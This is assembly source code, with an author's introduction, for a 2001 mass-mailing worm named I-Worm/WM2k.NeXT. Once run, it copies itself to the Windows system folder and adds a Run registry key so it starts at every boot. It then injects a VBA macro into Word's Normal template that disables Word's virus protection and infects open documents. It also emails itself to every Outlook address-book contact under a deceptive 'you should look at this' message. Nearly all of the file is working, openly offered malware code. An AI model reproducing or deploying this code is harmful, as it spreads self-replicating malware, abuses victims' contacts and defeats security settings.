; COMMENT#
; 
;                            ⁄¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬ø
;                            √≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈¥ 
;                            √≈≈≈≈¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡≈≈≈≈¥ 
;                            √≈≈≈¥ I-Worm/WM2k.NeXT √≈≈≈¥ 
;                            √≈≈≈¥   by Benny/29A   √≈≈≈¥
;                            √≈≈≈≈¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬≈≈≈≈¥
;                            √≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈¥
;                            ¿¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡Ÿ
; 
; 
; After a long pause (after the incident with Winux virus) I decided to release
; my next worm, called I-Worm/WM2k.NeXT. Ppl that know me at least a bit gonna
; ask, in what is this worm special in. In the way it worx its nothing much
; special, but in the way how it is coded, its special a bit. At least for me.
; 
; This very small piece of code is kinda multiplatform. It can spread via
; MS Outlook and MS Word, using standard OLE/COM functionz that MS Office
; provides. The worm is divided to two partz, EXE and VBA.
; 
; 
; ⁄ƒƒƒƒƒƒƒƒƒƒƒø
; ≥ EXE part: ≥
; ¿ƒƒƒƒƒƒƒƒƒƒƒŸ
; 
; When EXE part will become executed, the first what will worm do is that it
; will copy itself to windows system folder and write a key to registry so the
; worm will be executed with every start of system. Then it will initialize OLE
; interface and create two threads.
; 
; 1. Thread will:
; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
; 
; - wait until MS Word is executed
; - drop macro script to the root directory of C drive.
; - import the script to Normal template of Word using OLE/COM interface
; 
; 2. Thread will:
; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
; 
; - wait until MS Outlook is executed
; - send EXE part of worm to all email addresses found in Outlook's address
;   book using OLE/COM interface
; 
; Worm will exit after both two threadz will successfuly finish their job.
; EXE part contains one WinZIP icon and is compressed and armoured by tElock
; v.0.80.
; 
; 
; ⁄ƒƒƒƒƒƒƒƒƒƒƒø
; ≥ VBA part: ≥
; ¿ƒƒƒƒƒƒƒƒƒƒƒŸ
; 
; Infected Document contains two macros, which are automaticaly executed in
; dependency on some events.
; 
; 1. Macro AutoOpen () will:
; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
; 
; - disable virus protection and sets autosaving of Normal template
; - will copy all macro module to Normal template
; 
; 2. Macro FileSave () will:
; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
; 
; - export whole macro module to system folder
; - import whole macro module to all opened documents
; - copy whole macro module to Normal template and save it
; - send both of exe part and document part of worm to all email addresses
;   found in MS Outlook's address book
; 
; 
; And that's all. I coded this worm becoz I wanted to learn how to work with
; OLE/COM in assembler. In VisualBasic, its super easy, everybody know that.
; In assembler, its simple, but not so simple as in VB. Just look at the code
; and see by yourself. Its a bit complicated, but easy too.
; 
; Have a fun!
; 
; 
; (c)oded in August, 2001
; Czech Republic.
; #


.386p
.model  flat

include win32api.inc
include useful.inc
include mz.inc
include pe.inc


invoke  macro   api             ;macro for API callz
    extrn   api:PROC
    call    api
endm


DISPPARAMS              STRUC
Arguments               DD      0           ;Array of arguments.
Disp_IDs                DD      0           ;Dispatch ID's of named arguments.
Argument_Count          DD      0           ;Number of arguments.
Disp_ID_Count           DD      0           ;Number of dispatcher IDs.
DISPPARAMS              ENDS




.data
variant_result      dw  8       ;BSTR
            dw  ?
            dd  ?
result_union        dq  ?


variant_argument    dw  8       ;BSTR
            dw  ?
            dd  ?
argument_union      dd  ?,?


dword_argument      dw  3       ;I4
            dw  ?
            dd  ?
dword_union     dd  ?,?


winword_object      dd  ?       ;handle to winword
outlook_object      dd  ?       ;handle to outlook
winword_dispatcher  dd  ?       ;winword dispatcher
outlook_dispatcher  dd  ?       ;outlook dispatcher
dispatcher_params   dq  ?,?     ;parameters for dispatcher
IID_NULL        dq  ?,?     ;NULL

sysdir          dw  MAX_PATH+30 dup (?)
filename        dw  MAX_PATH+30 dup (?)
filename2       db  MAX_PATH+30 dup (?)

hThread1        dd  ?
hThread2        dd  ?
tmp         dd  ?
tmp2            dd  ?


.code
Start:  pushad
    @SEH_SetupFrame <jmp    end_seh>

    mov edi,offset sysdir
    push    edi
    push    MAX_PATH
    push    edi
    invoke  GetSystemDirectoryW
    imul    eax,2
    add edi,eax
    xor eax,eax
    @pushsz '\next.exe'
    pop esi
    push    13
    pop ecx
cpy:    lodsb
    stosw                   ;create system_dir+"\next.exe"
    loop    cpy             ;string
    pop edi

    mov esi,offset filename
    push    MAX_PATH
    push    esi
    push    400000h
    invoke  GetModuleFileNameW      ;get full filename of the worm

    push    0
    push    edi
    push    esi
    invoke  CopyFileW           ;copy worm to system folder
    dec eax
    jne end_seh

    mov esi,edi
    mov edi,offset filename2
    xor ecx,ecx
    dec ecx
    push    edi
r_n:    lodsw
    stosb                   ;convert unicode string to ANSI
    inc ecx
    test    al,al
    jne r_n
    pop edi
    
    push    ecx
    push    edi
    push    1               ;REG_SZ
    @pushsz 'NeXT'
    @pushsz 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    push    80000002h
    invoke  SHSetValueA         ;write a key to registry

    push    0
    push    0
    invoke  CoInitializeEx          ;initialize OLE/COM
    test    eax,eax
    jne end_seh

    push    eax
    push    1
    push    eax
    push    eax
    invoke  CreateEventA            ;create synchronization object
    test    eax,eax
    je  end_ole
    mov [hEvent],eax

    xor eax,eax
    push    offset tmp
    push    eax
    push    eax
    push    offset Thread_Word
    push    eax
    push    eax
    invoke  CreateThread            ;create 1st thread
    test    eax,eax
    je  end_ole
    mov [hThread1],eax
    xchg    eax,esi

    xor eax,eax
    push    offset tmp
    push    eax
    push    eax
    push    offset Thread_Outlook
    push    eax
    push    eax
    invoke  CreateThread            ;create 2nd thread
    test    eax,eax
    je  end_seh
    mov [hThread2],eax
    xchg    eax,edi

    push    -1
    push    1
    push    offset hThread1
    push    2
    invoke  WaitForMultipleObjects      ;wait until all threadz will be
    push    12345678h           ;finished
hEvent = dword ptr $-4
    push    esi
    push    edi
    invoke  CloseHandle
    invoke  CloseHandle
    invoke  CloseHandle

end_ole:invoke  CoUninitialize          ;uninitialize OLE/COM
end_seh:@SEH_RemoveFrame
    popad
    push    0
    invoke  ExitProcess         ;exit worm







tw_wait:push    1000
    invoke  Sleep               ;wait 1 second
    jmp tw_go

Thread_Word Proc                ;WINWORD thread
    pushad
    @SEH_SetupFrame <jmp    end_tw>

tw_go:  mov esi,offset winword_object
    push    esi
    push    0
    push    offset winword_CLSID
    invoke  GetActiveObject         ;look out if winword is active
    test    eax,eax
    jne tw_wait             ;no? then wait 1 second

    push    eax
    push    FILE_ATTRIBUTE_NORMAL
    push    CREATE_ALWAYS
    push    eax
    push    eax
    push    GENERIC_WRITE
    call    @wm_f
@imp:   dw  'c',':','\','I','O','.','S','Y','0',0
@wm_f:  invoke  CreateFileW         ;create new file
    inc eax
    je  end_tw
    dec eax
    cdq
    xchg    eax,ebx

    push    edx
    push    offset tmp2
    push    end_wm_macro-wm_macro
    push    offset wm_macro
    push    ebx
    invoke  WriteFile           ;write there macro script
    dec eax
    jne end_tw

    push    ebx
    invoke  CloseHandle         ;and close file

    mov ebx,offset winword_dispatcher
    push    ebx
    push    offset winword_interface
    lodsd
    push    eax
    mov eax,[eax]
    call    [eax]               ;IUnknown::QueryInterface
    test    eax,eax
    jne end_tw

        ;NormalTemplate.VBProject.VBComponents.Import("c:\io.sy0")

    push    -1
    push    [hEvent]
    invoke  WaitForSingleObject     ;synchronization with 2nd thread

    mov ebx,[ebx]
    push    8               ;.NormalTemplate
    pop edx
    call    DispInvoke_Get
    jne end_tw

    push    63h             ;.VBProject
    pop edx
    call    DispInvoke_Get
    jne end_tw

    push    87h
    pop edx
    call    DispInvoke_Get          ;.VBComponents
    jne end_tw
    mov edi,ebx             ;EDI = .VBComponents

    push    0Ah             ;.Count
    pop edx
    call    DispInvoke_Get
    dec ebx
    jne end_tw

    inc dword ptr [dispatcher_params.Argument_Count]
    mov dword ptr [dispatcher_params.Arguments],offset variant_argument
    mov [argument_union],offset @imp

    push    0Dh             ;.Import
    pop edx
    mov ebx,edi
    call    DispInvoke

end_tw: @SEH_RemoveFrame
    popad
    push    [hEvent]
    invoke  SetEvent            ;synchronization with 2nd thread
    push    0
    invoke  ExitThread          ;terminate thread
Thread_Word EndP



to_wait:push    1000
    invoke  Sleep               ;wait 1 second
    jmp to_go

Thread_Outlook  Proc
    pushad
    @SEH_SetupFrame <jmp    end_tw>

to_go:  mov esi,offset outlook_object
    push    esi
    push    0
    push    offset outlook_CLSID
    invoke  GetActiveObject         ;look out if outlook is active
    test    eax,eax
    jne to_wait

    mov ebx,offset outlook_dispatcher
    push    ebx
    push    offset outlook_interface
    lodsd
    push    eax
    mov eax,[eax]
    call    [eax]               ;IUnknown::QueryInterface
    test    eax,eax
    jne end_tw
    mov ebx,[ebx]
    mov [o_if],ebx

    push    -1
    push    [hEvent]
    invoke  WaitForSingleObject     ;synchronization with 1st thread

    call    @mapi
    dw  'M','A','P','I',0
@mapi:  pop eax
    mov [argument_union],eax

    ;set mapi = Outlook.GetNameSpace("MAPI")

    inc dword ptr [dispatcher_params.Argument_Count]
    mov dword ptr [dispatcher_params.Arguments],offset variant_argument
    mov edx,110h            ;.GetNamespace
    call    DispInvoke
    jne end_tw
    mov edi,ebx             ;EDI = mapi

    ;mapi.AddressLists.Count

    dec dword ptr [dispatcher_params.Argument_Count]
    mov edx,210Dh           ;.AddressLists
    call    DispInvoke_Get
    jne end_tw
    push    50h             ;.Count
    pop edx
    call    DispInvoke
    jne end_tw
    mov ecx,ebx

@l1:    pushad

    ;set a = mapi.AddressLists(i)

    inc dword ptr [dispatcher_params.Argument_Count]
    mov dword ptr [dispatcher_params.Arguments],offset dword_argument
    mov eax,[esp.Pushad_ecx]
    mov [dword_union],eax
    mov ebx,edi
    mov edx,210Dh           ;.AddressLists
    call    DispInvoke
    mov edi,ebx             ;EDI = a

    ;a.AddressEntries.Count

    dec dword ptr [dispatcher_params.Argument_Count]
    mov edx,100h            ;.AddressEntries
    call    DispInvoke_Get
    mov [address_entries],ebx
    push    50h             ;.Count
    pop edx
    call    DispInvoke
    mov ecx,ebx

@l2:    pushad

    ;a.AddressEntries.Item(x).Address

    inc dword ptr [dispatcher_params.Argument_Count]
    mov dword ptr [dispatcher_params.Arguments],offset dword_argument
    mov eax,[esp.Pushad_ecx]
    mov [dword_union],eax
    mov ebx,12345678h
address_entries = dword ptr $-4
    mov edx,51h             ;.Item
    call    DispInvoke
    dec dword ptr [dispatcher_params.Argument_Count]
    mov edx,3003h           ;.Address
    call    DispInvoke
    mov edi,ebx             ;EDI = address

    ;Set newMail = Outlook.CreateItem(0)

    inc dword ptr [dispatcher_params.Argument_Count]
    and dword ptr [tmp],0
    mov dword ptr [dispatcher_params.Arguments],offset tmp
    mov edx,10Ah            ;.CreateItem
    mov ebx,12345678h
o_if = dword ptr $-4
    call    DispInvoke_Get
    mov esi,ebx             ;ESI = new email object

    ;newMail.Recipients.Add (address)

    dec dword ptr [dispatcher_params.Argument_Count]
    mov edx,0F814h          ;.Recipients
    call    DispInvoke_Get
    inc dword ptr [dispatcher_params.Argument_Count]
    mov dword ptr [dispatcher_params.Arguments],offset variant_argument
    mov [argument_union],edi
    push    6Fh             ;.Add
    pop edx
    call    DispInvoke

    ;newMail.Subject = "You should look at this"

    call    @subj
    dw  'y','o','u',' ','s','h','o','u','l','d',' ','l','o','o','k',' ','a','t',' '
    dw  't','h','i','s',0
@subj:  pop eax
    mov [argument_union],eax
    mov ebx,esi
    push    37h             ;.Subject
    pop edx
    call    DispInvoke_Put

    ;newMail.Body = "Hello," & vbCrLf & "I found this file on my HDD and it
    ;seems it's yours. Please have a look at it and give me know." & vbCrLf
    ;& "Thank you."

    call    @body
    dw  'H','e','l','l','o',',',0Dh,0Ah,'I',' ','f','o','u','n','d',' '
    dw  't','h','i','s',' ','f','i','l','e',' ','o','n',' ','m','y',' '
    dw  'H','D','D',' ','a','n','d',' ','i','t',' ','s','e','e','m','s'
    dw  ' ','i','t','''','s',' ','y','o','u','r','s','.',' ','P','l','e'
    dw  'a','s','e',' ','c','h','e','c','k',' ','i','t',' ','o','u','t'
    dw  'a',,'n','d',' ','g','i','v','e',' ','m','e',' ','k','n',,'o'
    dw  'w','.',,0Dh,0Ah,'T','h','a','n','k',' ','y','o','u','.',0
@body:  pop eax
    mov [argument_union],eax
    mov ebx,esi
    mov edx,9100h           ;.Body
    call    DispInvoke_Put

    dec dword ptr [dispatcher_params.Argument_Count]
    mov ebx,esi
    mov edx,0F815h          ;.Attachments
    call    DispInvoke_Get


    push    offset sysdir
    invoke  SysAllocString
    mov edi,eax

    inc dword ptr [dispatcher_params.Argument_Count]
    mov [argument_union],edi
    push    65h             ;.Add
    pop edx
    call    DispInvoke

    push    edi
    invoke  SysFreeString

    dec dword ptr [dispatcher_params.Argument_Count]
    mov ebx,esi
    mov edx,0F075h          ;.Send
    call    DispInvoke

    popad
    dec ecx
    test    ecx,ecx
    jne @l2             ;first loop

    popad
    dec ecx
    test    ecx,ecx
    jne @l1             ;second loop

    jmp end_tw              ;terminate thread
Thread_Outlook  EndP





;dispatcher call procedure

DispInvoke_Put:
    push    4               ;DISPATCH_PROPERTYPUT
    jmp dig2
DispInvoke:
    push    1               ;DISPATCH_METHOD
    jmp dig2
DispInvoke_Get  Proc
    push    2               ;DISPATCH_PROPERTYGET
dig2:   pop eax

    push    0
    push    0
    push    offset variant_result
    push    offset dispatcher_params
    push    eax
    push    800h                ;LOCALE_SYSTEM_DEFAULT
    push    offset IID_NULL
    push    edx
    push    ebx
    mov eax,[ebx]
    call    [eax+18h]           ;IDispatch::Invoke

    mov ebx,dword ptr [result_union]
    test    eax,eax
    ret
DispInvoke_Get  EndP


signature       db  0,'I-Worm/WM2k.NeXT by Benny/29A',0


winword_CLSID       dd  000209FFh,0
            db  0C0h,0,0,0,0,0,0,46h

winword_interface   dd  00020400h,0
            db  0C0h,0,0,0,0,0,0,46h

outlook_CLSID       dd  0006F03Ah,0
            db  0C0h,0,0,0,0,0,0,46h

outlook_interface   dd  00020400h,0
            db  0C0h,0,0,0,0,0,0,46h

wm_macro:
db  "Sub AutoOpen()",0Dh,0Ah
db  "On Error Resume Next",0Dh,0Ah
db  "Application.ScreenUpdating = False",0Dh,0Ah
db  "Application.DisplayAlerts = wdAlertsNone",0Dh,0Ah
db  "Options.SaveNormalPrompt = False",0Dh,0Ah
db  "Options.VirusProtection = False",0Dh,0Ah
db  "Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=""Module1"", Object:=wdOrganizerObjectProjectItems",0Dh,0Ah
db  "End Sub",0Dh,0Ah
db  "Sub FileSave()",0Dh,0Ah
db  "On Error Resume Next",0Dh,0Ah
db  "Set fso = CreateObject(""Scripting.FileSystemObject"")",0Dh,0Ah
db  "Set DirSys = fso.GetSpecialFolder(1)",0Dh,0Ah
db  "vcode = DirSys & ""\win32k.dll""",0Dh,0Ah
db  "ThisDocument.VBProject.VBComponents(2).Export (vcode)",0Dh,0Ah
db  "If NormalTemplate.VBProject.VBComponents.Count = 2 Then",0Dh,0Ah
db  "    NormalTemplate.VBProject.VBComponents(2).Export (vcode)",0Dh,0Ah
db  "End If",0Dh,0Ah
db  "For i = 1 To Documents.Count",0Dh,0Ah
db  "    installed = False",0Dh,0Ah
db  "    If Documents(i).VBProject.VBComponents.Count = 2 Then",0Dh,0Ah
db  "        If Documents(i).VBProject.VBComponents(2).Name = ""Module1"" Then",0Dh,0Ah
db  "            installed = True",0Dh,0Ah
db  "        End If",0Dh,0Ah
db  "    End If",0Dh,0Ah
db  "    If installed = False Then",0Dh,0Ah
db  "        Documents(i).VBProject.VBComponents.Import (vcode)",0Dh,0Ah
db  "        Documents(i).Save",0Dh,0Ah
db  "    End If",0Dh,0Ah
db  "Next",0Dh,0Ah
db  "If ActiveDocument.VBProject.VBComponents.Count = 2 Then",0Dh,0Ah
db  "    If ActiveDocument.VBProject.VBComponents(2).Name = ""Module1"" Then",0Dh,0Ah
db  "        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=""Module1"", Object:=wdOrganizerObjectProjectItems",0Dh,0Ah
db  "    End If",0Dh,0Ah
db  "End If",0Dh,0Ah
db  "NormalTemplate.Save",0Dh,0Ah
db  "Set Outlook = CreateObject(""Outlook.Application"")",0Dh,0Ah
db  "Set mapi = Outlook.GetNameSpace(""MAPI"")",0Dh,0Ah
db  "ThisDocument.Save",0Dh,0Ah
db  "doc = ThisDocument.FullName",0Dh,0Ah
db  "For i = 1 To mapi.AddressLists.Count",0Dh,0Ah
db  "    Set a = mapi.AddressLists(i)",0Dh,0Ah
db  "    For x = 1 To a.AddressEntries.Count",0Dh,0Ah
db  "        Set newMail = Outlook.CreateItem(0)",0Dh,0Ah
db  "        newMail.Recipients.Add (a.AddressEntries(x))",0Dh,0Ah
db  "        newMail.Subject = ""You should look at this""",0Dh,0Ah
db  "        newMail.Body = ""Hello,"" & vbCrLf & ""I found these files on my HDD and it seems it's yours. Please check them out and give me know."" & vbCrLf & ""Thank you.""",0Dh,0Ah
db  "        newMail.Attachments.Add (DirSys & ""\next.exe"")",0Dh,0Ah
db  "        newMail.Attachments.Add (doc)",0Dh,0Ah
db  "        newMail.Send",0Dh,0Ah
db  "    Next",0Dh,0Ah
db  "Next",0Dh,0Ah
db  "End Sub"
end_wm_macro:
End Start
